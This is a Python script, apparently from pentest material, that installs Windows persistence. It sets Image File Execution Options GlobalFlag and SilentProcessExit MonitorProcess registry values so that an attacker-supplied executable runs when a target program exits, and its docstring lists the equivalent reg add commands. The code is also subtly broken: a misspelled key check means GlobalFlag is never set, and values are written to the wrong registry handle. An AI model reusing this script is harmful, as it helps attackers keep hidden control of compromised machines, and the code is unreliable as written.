#!/usr/bin/env python3

r"""
The following registry edits will allows us establish persistence via GlobalFlags in image file execution options:
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\pentestlab.exe"

In order for the persistence mechanism to work, the attacker must have administrator rights
"""

from winreg import (
  ConnectRegistry,
  OpenKey,
  SetValueEx,
  EnumValue,
  EnumKey,
  QueryInfoKey,
  CreateKeyEx,
  KEY_ALL_ACCESS,
  KEY_WRITE,
  REG_SZ,
  REG_DWORD,
  HKEY_LOCAL_MACHINE,
)

from ctypes import (
  windll,
  c_long,
  byref
)

from sys import argv

target_reg_keys = (
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options",
  "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit",
)

def flush_registry_changes():
  HWND_BROADCAST = 0xFFFF
  WM_SETTINGCHANGE = 0x1A
  SMTO_ABORTIFHUNG = 0x0002
  result = c_long()
  SendMessageTimeoutW = windll.user32.SendMessageTimeoutW
  SendMessageTimeoutW (
    HWND_BROADCAST, WM_SETTINGCHANGE, 0,
    u"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    SMTO_ABORTIFHUNG, 5000, byref(result)
  )    

def persist(malicious_exe_path:str, target_exe:str, target_reg_keys:list):
  with ConnectRegistry(None, HKEY_LOCAL_MACHINE) as hklm:
    # create the `Image File Execution Options` subkey with target executable
    CreateKeyEx(hklm, target_reg_keys[0], 0, KEY_WRITE)
    # create the `SilentProcessExit` subkey with target executable
    CreateKeyEx(hklm, target_reg_keys[1], 0, KEY_WRITE)
    for reg_key in target_reg_keys:
      with OpenKey(hklm, reg_key, 0, KEY_ALL_ACCESS) as target_key:
        for _ in range(QueryInfoKey(target_key)[0]):
          if "Image File Exection" in reg_key:
            SetValueEx(hklm, "GlobalFlag", 0, REG_DWORD, 512)
          else:
            SetValueEx(hklm, "ReportingMode", 0, REG_DWORD, 1)
            SetValueEx(hklm, "MonitorProcess", 0, REG_SZ, malicious_exe_path)

if __name__ == "__main__":
  target_exe = argv[1]
  malicious_exe_path = argv[2]
  target_reg_keys = list(map(lambda key: key + "\\" + target_exe, target_reg_keys))
  persist(malicious_exe_path, target_exe, target_reg_keys)
